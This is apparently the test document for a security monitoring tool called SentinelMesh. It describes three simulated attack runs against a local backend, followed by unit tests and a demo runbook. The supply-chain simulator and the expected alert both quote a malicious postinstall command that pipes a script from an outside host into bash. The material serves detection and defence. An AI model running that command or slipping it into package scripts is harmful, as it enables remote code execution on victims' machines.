# SentinelMesh — Test Document

> All 3 live test runs documented with setup, expected output, and judge view

---

## Test Run 1 — OAuth "Allow All" Interception

**Attack Simulated:** Vercel / Context.ai April 2026 breach vector  
**Expected Time to Block:** < 2 seconds

### Setup (5 minutes)

```bash
# 1. Start the full stack
docker-compose up -d

# 2. Open admin dashboard
open http://localhost:3000

# 3. Run the OAuth attack simulator
python attacker_sim/oauth_attack.py
```

### What the Simulator Does

```python
# attacker_sim/oauth_attack.py — sends this event to backend
{
  "attack_type": "OAUTH_OVERPERMISSION",
  "source": "chrome_extension",
  "scopes": [
    "https://mail.google.com/",                    # +40 pts (CRITICAL)
    "https://www.googleapis.com/auth/drive",        # +30 pts (HIGH)
    "https://www.googleapis.com/auth/calendar",     # +15 pts (MEDIUM)
  ],
  "app": "context-ai-office-suite@googleusercontent.com",
  "breach_fingerprint": "Vercel April 2026",
  "evidence": [
    "Requested Gmail Full Access",
    "Requested Drive Full Access",
    "Requested Calendar Full Access",
    "Grant at 03:14 AM — off-hours activity"
  ]
}
```

### What SentinelMesh Does

```
Detector: oauth_risk_scorer([Gmail, Drive, Calendar])
  → score = 40 + 30 + 15 = 85/100 → CRITICAL → BLOCK

Listener: cross-checks behavioral baseline
  → 03:14 AM activity, no prior grant history for this app
  → anomaly_score = 60

Gatekeeper: combined_score = 85 > threshold 70
  → decision: BLOCK + QUARANTINE
  → signs verdict with ECDSA

Supervisor: generates IncidentCard, notifies Telegram
```

### Expected Dashboard Output

```
🔴 SENTINEL ALERT [CRITICAL]
────────────────────────────────────────
Type:       OAUTH_OVERPERMISSION
Score:      85/100
App:        context-ai-office-suite@googleusercontent.com
Scopes:     Gmail Full (+40), Drive Full (+30), Calendar Full (+15)
Verdict:    BLOCKED — Supervisor approval required
Time:       1.2 seconds from event to alert
Reference:  Matches Vercel April 2026 breach fingerprint
────────────────────────────────────────
[Approve]  [Block]  [Investigate]
```

### What Judge Sees

A real Google OAuth-style consent screen simulation → SentinelMesh fires → grant is blocked **before it's clicked**. Telegram message appears on demo phone. ✅

---

## Test Run 2 — Bulk Credential Enumeration Detection

**Attack Simulated:** Stage 4 of Vercel breach — internal credential enumeration  
**Expected Detection:** < 5 seconds into 4-second attack

### Setup

```bash
# Run the credential dump simulator
python attacker_sim/cred_dump.py
```

### What the Simulator Does

```python
# attacker_sim/cred_dump.py
projects = [f"project_{i}" for i in range(10)]
vars = ["DATABASE_URL", "STRIPE_SECRET_KEY", "OPENAI_API_KEY",
        "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN"]

for p in projects:
    for var in vars:
        # Posts env read event to backend for each of 50 reads
        requests.post("http://localhost:8000/api/v1/events", json={
            "attack_type": "CREDENTIAL_ENUMERATION",
            "project": p,
            "variable": var,
            "reads_per_min": 750,
            "unique_projects": 10
        })
        time.sleep(0.08)  # 50 reads in ~4 seconds
```

### What SentinelMesh Does

```
Listener: build_baseline() → normal = 3 reads/min, 1 project
  → current: 750 reads/min, 10 projects
  → anomaly_factor = 250x
  → velocity_anomaly = CRITICAL

Detector: env_read_monitor(750, 10)
  → 750 > 3 * 5 = 15 threshold → CREDENTIAL_ENUMERATION_DETECTED
  → score = 95/100

Gatekeeper: BLOCK + QUARANTINE_SESSION
```

### Expected Dashboard Output

```
🔴 SENTINEL ALERT [CRITICAL]
────────────────────────────────────────
Type:       CREDENTIAL_ENUMERATION
Score:      95/100
Pattern:    Bulk credential enumeration
Rate:       750 env reads/min (baseline: 3/min) — 250x anomaly
Scope:      10 projects, 50 unique secrets
Verdict:    SESSION QUARANTINED
Timeline:   This exact pattern preceded the Vercel breach by 9 days
────────────────────────────────────────
```

### What Judge Sees

Script runs in terminal → reads spike in real-time on dashboard → dashboard lights red → session quarantined alert appears. Timeline card says "Pattern matched: 9 days before Vercel breach." ✅

---

## Test Run 3 — Supply Chain Dependency Poisoning Alert

**Attack Simulated:** Axios npm attack — malicious maintainer + postinstall RAT  
**Expected Detection:** Before package installs

### Setup

```bash
# Run the supply chain attack simulator
python attacker_sim/supply_chain.py
```

### What the Simulator Does

```python
# attacker_sim/supply_chain.py
requests.post("http://localhost:8000/api/v1/events", json={
    "attack_type": "SUPPLY_CHAIN",
    "source": "n8n_node",
    "package": "plain-crypto-js",
    "version": "4.2.1",
    "risk_signals": [
        "NEW_MAINTAINER",      # Account age: 11 days
        "FRESH_RELEASE",       # Published: 18 hours ago
        "LOW_ADOPTION",        # Downloads: 23/week
        "POSTINSTALL_SCRIPT"   # curl http://185.220.x.x/payload.sh | bash
    ],
    "breach_fingerprint": "Axios npm March 2026",
    "evidence": [
        "Maintainer account age: 11 days (Axios attack used hijacked account)",
        "Package published: 18 hours ago",
        "Weekly downloads: 23 (Axios package had 83M)",
        "Postinstall script: curl http://185.220.x.x/payload.sh | bash"
    ]
})
```

### What SentinelMesh Does

```
Detector: supply_chain_auditor("plain-crypto-js", "4.2.1")
  → risk_signals: [NEW_MAINTAINER, FRESH_RELEASE, LOW_ADOPTION, POSTINSTALL_SCRIPT]
  → len(signals) = 4 >= threshold 2 → BLOCK_INSTALL
  → score = 88/100

Gatekeeper: BLOCK (score 88 > 70)
  → INSTALL never executes
  → Postinstall script never runs
```

### Expected Dashboard Output

```
🟠 SENTINEL ALERT [HIGH]
────────────────────────────────────────
Type:       SUPPLY_CHAIN_POISONING
Score:      88/100
Package:    plain-crypto-js@4.2.1
Risk Signals:
  • NEW_MAINTAINER (account age: 11 days)
  • FRESH_RELEASE (published: 18 hours ago)
  • LOW_ADOPTION (downloads: 23/week)
  • POSTINSTALL_SCRIPT detected

Postinstall: curl http://185.220.x.x/payload.sh | bash
Verdict:    INSTALL BLOCKED — Supervisor review required
Reference:  Matches Axios March 2026 attack fingerprint
────────────────────────────────────────
```

### What Judge Sees

`npm install` command shown → SentinelMesh intercepts → malicious postinstall script content revealed → blocked before execution. Judge sees exactly what would have happened without SentinelMesh. ✅

---

## Unit Tests — `tests/`

### Detector Tests — `tests/test_detector.py`

```python
import pytest
from core.detector import oauth_risk_scorer, env_read_monitor, supply_chain_auditor

def test_oauth_critical_block():
    result = oauth_risk_scorer([
        "https://mail.google.com/",
        "https://www.googleapis.com/auth/drive",
    ])
    assert result["risk_score"] == 70
    assert result["verdict"] == "WARN"  # exactly at threshold

def test_oauth_over_threshold():
    result = oauth_risk_scorer([
        "https://mail.google.com/",
        "https://www.googleapis.com/auth/drive",
        "https://www.googleapis.com/auth/calendar",
    ])
    assert result["risk_score"] == 85
    assert result["verdict"] == "BLOCK"

def test_oauth_safe():
    result = oauth_risk_scorer(["https://www.googleapis.com/auth/userinfo.email"])
    assert result["verdict"] == "ALLOW"

def test_cred_dump_critical():
    result = env_read_monitor(reads_per_min=750, unique_projects=10)
    assert result["severity"] == "CRITICAL"
    assert result["action"] == "QUARANTINE_SESSION"
    assert result["anomaly_factor"] == 250.0

def test_cred_normal():
    result = env_read_monitor(reads_per_min=2, unique_projects=1)
    assert result["severity"] == "OK"
```

### Gatekeeper Tests — `tests/test_gatekeeper.py`

```python
from core.gatekeeper import make_verdict

def test_block_decision():
    v = make_verdict(threat_score=85, anomaly_score=60, action="install_package")
    assert v["decision"] == "BLOCK"
    assert v["action_taken"] == "QUARANTINE"
    assert "signature" in v
    assert len(v["signature"]) > 0

def test_queue_decision():
    v = make_verdict(threat_score=50, anomaly_score=40, action="oauth_grant")
    assert v["decision"] == "QUEUE"

def test_allow_decision():
    v = make_verdict(threat_score=10, anomaly_score=5, action="env_read")
    assert v["decision"] == "ALLOW"

def test_signature_unique():
    v1 = make_verdict(85, 60, "action_a")
    v2 = make_verdict(85, 60, "action_b")
    assert v1["signature"] != v2["signature"]  # different actions = different sigs
```

### Backend API Tests — `tests/test_api.py`

```python
from fastapi.testclient import TestClient
from backend.main import app

client = TestClient(app)

def test_ingest_event():
    response = client.post("/api/v1/events", json={
        "attack_type": "OAUTH_OVERPERMISSION",
        "source": "test",
        "scopes": ["https://mail.google.com/"]
    })
    assert response.status_code == 200
    assert response.json()["status"] == "queued"

def test_get_alerts_empty():
    response = client.get("/api/v1/alerts")
    assert response.status_code == 200
    assert isinstance(response.json(), list)

def test_block_incident():
    response = client.post("/api/v1/block/INC-TEST-001")
    assert response.status_code in [200, 404]  # 404 if incident not found
```

### Run All Tests

```bash
cd sentinelmesh
pip install pytest pytest-asyncio httpx
pytest tests/ -v --tb=short

# Expected output:
# tests/test_detector.py::test_oauth_critical_block PASSED
# tests/test_detector.py::test_oauth_over_threshold PASSED
# tests/test_detector.py::test_cred_dump_critical PASSED
# tests/test_gatekeeper.py::test_block_decision PASSED
# tests/test_api.py::test_ingest_event PASSED
# ...
```

---

## Demo Day Runbook

### Pre-Demo Checklist (30 min before)

```
□ docker-compose up -- all 4 containers healthy
□ Dashboard opens at http://localhost:3000
□ Backend docs at http://localhost:8000/docs
□ Telegram bot responds to /start
□ All 3 attack simulators dry-run without errors
□ Terminal font size 18+ for screen visibility
□ Chrome extension loaded (if showing OAuth demo)
□ Network: local only — no internet dependency for core demo
```

### Live Demo Script

```
1. OPEN: http://localhost:3000 — show empty dashboard
2. SAY: "Let me show you the exact attack that cost Vercel $2M"
3. RUN: python attacker_sim/oauth_attack.py
4. POINT: Dashboard alert appears in < 2 seconds
5. SHOW: Telegram phone notification
6. CLICK: [Investigate] → show full incident card + breach fingerprint
7. SAY: "That took 8 seconds. It took Vercel 22 months."
8. (Optional) RUN: python attacker_sim/cred_dump.py → show session quarantine
9. SHOW: /audit-trail → signed log entries
```
